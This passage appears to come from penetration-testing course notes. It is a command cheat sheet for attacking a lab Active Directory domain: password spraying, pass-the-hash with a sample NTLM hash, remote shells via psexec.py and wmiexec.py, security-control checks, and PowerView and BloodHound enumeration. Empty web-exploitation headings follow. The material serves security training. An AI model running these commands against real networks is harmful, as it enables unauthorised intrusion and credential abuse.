| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |

#### Enumerating Security Controls

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-MpComputerStatus`                                       | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode`                | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host. |
| `Find-LAPSDelegatedGroups`                                   | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |
| `Find-AdmPwdExtendedRights`                                  | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                          | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |

#### Credentialed Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files.  The results are outputted in `JSON`. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| ` rpcclient $> queryuser 0x457`                              | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers`                                  | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  ` | Impacket tool used to connect to the `CLI`  of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  ` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h`                                         | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`)  as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |

#### Enumeration by Living Off the Land

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
| `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name`                        | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"`                   | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"`             | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV`                                        | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |
| `ConvertTo-SID`                                              | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |
| `Get-DomainSPNTicket`                                        | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |
| `Get-Domain`                                                 | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController`                                       | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser`                                             | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer`                                         | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup`                                            | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU`                                               | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl`                                  | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember`                                      | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer`                                       | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare`                                         | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO`                                              | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy`                                           | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup`                                          | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember`                                    | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare`                                               | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession`                                             | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess`                                           | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation`                                    | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare`                                           | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile`                            | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess`                                      | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |
| `Get-DomainTrust`                                            | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust`                                            | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser`                                      | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember`                               | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`   | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |
| `.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`          | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

<a id="web-exploitation"></a>
## Web Exploitation

<a id="14-using-web-proxies"></a>
### 14. Using Web Proxies

<a id="15-attacking-web-applications-with-ffuf"></a>
### 15. Attacking Web Applications with Ffuf

<a id="16-login-brute-forcing"></a>
### 16. Login Brute Forcing

<a id="17-sql-injection-fundamentals"></a>
### 17. SQL Injection Fundamentals

<a id="18-sqlmap-essentials"></a>
### 18. SQLMap Essentials

<a id="19-cross-site-scripting-xss"></a>
### 19. Cross-Site Scripting (XSS)

<a id="20-file-inclusion"></a>
### 20. File Inclusion

<a id="21-file-upload-attacks"></a>
### 21. File Upload Attacks

<a id="22-command-injections"></a>
### 22. Command Injections

<a id="23-web-attacks"></a>
### 23. Web Attacks

<a id="24-attacking-common-applications"></a>
### 24. Attacking Common Applications

<a id="post-exploitation"></a>
## Post-Exploitation

<a id="25-linux-privilege-escalation"></a>
### 25. Linux Privilege Escalation

<a id="26-windows-privilege-escalation"></a>
### 26. Windows Privilege Escalation

<a id="reporting--capstone"></a>
## Reporting & Capstone

<a id="27-documentation--reporting"></a>
### 27. Documentation & Reporting

<a id="28-attacking-enterprise-networks"></a>
### 28. Attacking Enterprise Networks

